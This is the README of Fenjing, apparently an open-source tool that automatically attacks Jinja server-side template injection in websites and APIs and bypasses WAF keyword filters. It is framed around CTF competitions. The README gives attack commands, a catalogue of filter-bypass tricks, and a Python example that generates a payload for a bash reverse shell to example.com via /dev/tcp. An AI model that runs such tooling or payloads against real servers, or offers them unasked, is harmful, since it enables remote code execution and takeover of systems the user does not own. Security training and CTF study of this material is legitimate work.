![焚靖](assets/fenjing.webp)

> Bypass the WAF without knowing WAF


[![Run tests](https://github.com/Marven11/Fenjing/raw/images/assets/run-tests.svg)](https://github.com/Marven11/Fenjing/actions/workflows/run-tests.yml)
[![Upload Python Package](https://github.com/Marven11/Fenjing/raw/images/assets/python-package.svg)](https://github.com/Marven11/Fenjing/actions/workflows/python-publish.yml)
[![codecov](https://github.com/Marven11/Fenjing/raw/images/assets/codecov.svg)](https://codecov.io/gh/Marven11/Fenjing)
[![Downloads](https://github.com/Marven11/Fenjing/raw/images/assets/downloads.svg)](https://pepy.tech/project/fenjing)
[![Downloads](https://github.com/Marven11/Fenjing/raw/images/assets/downloads-monthly.svg)](https://pepy.tech/project/fenjing)
![Static Badge](https://github.com/Marven11/Fenjing/raw/images/assets/license.svg)

[English](README_en.md) [V我50](https://github.com/Marven11/Marven11/blob/main/buy_me_a_coffee.md)

焚靖是一个针对CTF比赛中Jinja SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口，省去手动测试接口，fuzz题目WAF的时间。

## 演示

[![asciicast](assets/demo.gif)](https://asciinema.org/a/dMEIPe5NS9eZpQU9T06xZutHh)

## 主要特性

- 集成了大部分CTF中的SSTI WAF绕过技巧
- 全自动爆破API参数并攻击
- 全自动分析网站的WAF并生成相应的payload
- 支持攻击对应的HTML表单或HTTP路径
- 支持将payload放进GET参数中提交，有效降低payload长度
- 自动检测关键字替换并绕过
- ......

## 安装

在以下方法中选择一种

### 使用pipx安装运行（推荐）

```shell
# 首先使用apt/dnf/pip/...安装pipx
#pip install pipx
# 然后用pipx自动创建独立的虚拟环境并进行安装
pipx install fenjing
fenjing webui
# fenjing scan --url 'http://xxxx:xxx'
```

### 使用pip安装运行

```shell
pip install fenjing
fenjing webui
# fenjing scan --url 'http://xxxx:xxx'
```

### 下载并运行docker镜像

```shell
docker run --net host -it marven11/fenjing webui
```

## 使用

### webui

可以直接输入`python -m fenjing webui`启动webui，指定参数并自动攻击

![webui-example](assets/webui-example.png)

在左边填入参数并点击开始分析，然后在右边输入命令即可

### scan

在终端可以用scan功能，猜测某个页面的参数并自动攻击：

`python -m fenjing scan --url 'http://xxxx:xxx/yyy'`

### crack

也可以用crack功能，手动指定参数进行攻击：

`python -m fenjing crack --url 'http://xxxx:xxx/yyy' --detect-mode fast --inputs aaa,bbb --method GET`

这里提供了aaa和bbb两个参数进行攻击，并使用`--detect-mode fast`加速攻击速度

### crack-request

还可以将HTTP请求写进一个文本文件里（比如说`req.txt`）然后进行攻击

文本文件内容如下：

```http
GET /?name=PAYLOAD HTTP/1.1
Host: 127.0.0.1:5000
Connection: close

```

命令如下：

`python -m fenjing crack-request -f req.txt --host '127.0.0.1' --port 5000`

### crack-keywords

如果已经拿到了服务端源码`app.py`的话，可以自动提取代码中的列表作为黑名单生成对应的payload

命令如下：

`python -m fenjing crack-keywords -k app.py -c 'ls /'`

### 其他

此外还支持接受JSON的API，以及根据给定关键字生成payload的用法，详见[examples.md](examples.md)

## 详细使用和疑难解答

见[examples.md](examples.md)以及`--help`选项

## 技术细节

项目结构如下：

[![](https://mermaid.ink/img/pako:eNp1VD1vwyAQ_SsWUjNEcbt76FB17dROrSPrgo8YFYPLR5M0yn8vxmnAH2VA3OPd3eM4OBOqaiQFYUIdaAPaZm9Ppcz8MG6319A1mbNcmGwA-0GVUJr_YEQ0fjk0FnWEmNJt6iKNjeawQllPMxnUOZc-EAOKaUrBPxiYgkHuN1suQfTYNjIOuHM9Z9dzGNfI1HEAt6MwWZ4_DvhNRDZRQTXQT9Qm8RuQJBuwijlJqz3KiPoILbejMhgKsnJazGIFHQsO6fZylhRdihLKWsrJoTo4CQV1cqi7u6z2daKWK3m79OtlWTza6hvSGpgGhaiuYUZkxvdznLnIHusfe2SrceRwoqlzAFN79Y9I7QSayp46nIGhiyO4KC0wH9br--60yAw6ElK0h5xe1yzZ9TrS9hu10x847pRhDn264JL0yLzOpSQb0vpXArz2D_vc-5TENthiSQq_lOisBlGSUl48FZxVrydJSWG1ww3Ryu0b4p-RMN5yXQ0Wnzn4NmpvaAfyXaloY82t0i_DVxJ-lMsvGyVeZA?type=png)](https://mermaid.live/edit#pako:eNp1VD1vwyAQ_SsWUjNEcbt76FB17dROrSPrgo8YFYPLR5M0yn8vxmnAH2VA3OPd3eM4OBOqaiQFYUIdaAPaZm9Ppcz8MG6319A1mbNcmGwA-0GVUJr_YEQ0fjk0FnWEmNJt6iKNjeawQllPMxnUOZc-EAOKaUrBPxiYgkHuN1suQfTYNjIOuHM9Z9dzGNfI1HEAt6MwWZ4_DvhNRDZRQTXQT9Qm8RuQJBuwijlJqz3KiPoILbejMhgKsnJazGIFHQsO6fZylhRdihLKWsrJoTo4CQV1cqi7u6z2daKWK3m79OtlWTza6hvSGpgGhaiuYUZkxvdznLnIHusfe2SrceRwoqlzAFN79Y9I7QSayp46nIGhiyO4KC0wH9br--60yAw6ElK0h5xe1yzZ9TrS9hu10x847pRhDn264JL0yLzOpSQb0vpXArz2D_vc-5TENthiSQq_lOisBlGSUl48FZxVrydJSWG1ww3Ryu0b4p-RMN5yXQ0Wnzn4NmpvaAfyXaloY82t0i_DVxJ-lMsvGyVeZA)

payload生成原理见[howitworks.md](./howitworks.md)

支持的绕过规则如下

### 关键字符绕过：

- `'`和`"`
- `_`
- `[`
- 绝大多数敏感关键字
- 任意阿拉伯数字
- `+`
- `-`
- `*`
- `~`
- `{{`
- `%`
- ...

### 自然数绕过：

支持绕过0-9的同时绕过加减乘除，支持的方法如下：
- 十六进制
- a*b+c
- `(39,39,20)|sum`
- `(x,x,x)|length`
- unicode中的全角字符等

### `'%c'`绕过:

支持绕过引号，`g`，`lipsum`和`urlencode`等

### 下划线绕过：

支持`(lipsum|escape|batch(22)|list|first|last)`等
- 其中的数字22支持上面的数字绕过

### 任意字符串：

支持绕过引号，任意字符串拼接符号，下划线和任意关键词

支持以下形式

- `'str'`
- `"str"`
- `"\x61\x61\x61"`
- `dict(__class__=x)|join`
    - 其中的下划线支持绕过
- `'%c'*3%(97,97, 97)`
    - 其中的`'%c'`也支持上面的`'%c'`绕过
    - 其中的所有数字都支持上面的数字绕过
- 将字符串切分成小段分别生成
- ...

### 属性：

- `['aaa']`
- `.aaa`
- `|attr('aaa')`

### Item

- `['aaa']`
- `.aaa`
- `.__getitem__('aaa')`

## 其他技术细节

- 脚本会提前生成一些字符串并使用`{%set %}`设置在前方
- 脚本会在payload的前方设置一些变量提供给payload后部分的表达式。
- 脚本会在全自动的前提下生成较短的表达式。
- 脚本会仔细地检查各个表达式的优先级，尽量避免生成多余的括号。

## 详细使用

### 作为命令行脚本使用

各个功能的介绍：

- webui: 网页UI
  - 顾名思义，网页UI
  - 默认端口11451
- scan: 扫描整个网站
  - 从网站中根据form元素提取出所有的表单并攻击
  - 根据给定URL爆破参数，以及提取其他URL进行扫描
  - 扫描成功后会提供一个模拟终端或执行给定的命令
  - 示例：`python -m fenjing scan --url 'http://xxx/'`
- crack: 对某个特定的表单进行攻击
  - 需要指定表单的url, action(GET或POST)以及所有字段(比如'name')
  - 攻击成功后也会提供一个模拟终端或执行给定的命令
  - 示例：`python -m fenjing crack --url 'http://xxx/' --method GET --inputs name`
- crack-path: 对某个特定的路径进行攻击
  - 攻击某个路径（如`http://xxx.xxx/hello/<payload>`）存在的漏洞
  - 参数大致上和crack相同，但是只需要提供对应的路径
  - 示例：`python -m fenjing crack-path --url 'http://xxx/hello/'`
- crack-request: 读取某个请求文件进行攻击
  - 读取文件里的请求，将其中的`PAYLOAD`替换成实际的payload然后提交
  - 根据HTTP格式会默认对请求进行urlencode, 可以使用`--urlencode-payload 0`关闭
- crack-json: 攻击指定的JSON API
  - 当一个API的body格式为JSON时攻击这个JSON中的某个键
  - 示例：`python -m fenjing crack-json --url 'http://127.0.0.1:5000/crackjson' --json-data '{"name": "admin", "age": 24, "msg": ""}' --key msg`
- crack-keywords: 读取文件中的所有关键字并攻击
  - 从.txt, .py或者.json文件中读取所有关键字，对给定的shell指令生成对应的payload
  - 示例：`python -m fenjing crack-keywords -k waf.json -o payload.jinja2 --command 'ls /'`

一些特殊的选项：
- `--eval-args-payload`：将payload放在GET参数x中提交
- `--detect-mode`：检测模式，可为accurate或fast
- `--environment`：指定模板的渲染环境，默认认为模板在flask中的`render_template_string`中渲染
- `--tamper-cmd`：在payload发出前编码
  - 例如：
    - `--tamper-cmd 'rev'`：将payload反转后再发出
    - `--tamper-cmd 'base64'`：将payload进行base64编码后发出
    - `--tamper-cmd 'base64 | rev'`：将payload进行base64编码并反转后再发出
- 详细解释见[examples.md](examples.md)


### 作为python库使用

参考[example.py](example.py)

```python
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str):
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]
    return all(word in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    config_payload = config_payload(waf)

    print(f"{shell_payload=}")
    print(f"{config_payload=}")

```

其他使用例可以看[这里](examples.md)

## 捐赠

这里空空如也

## Stars

[![Stargazers over time](https://github.com/Marven11/Fenjing/raw/images/assets/stars.svg)](https://starchart.cc/Marven11/Fenjing)
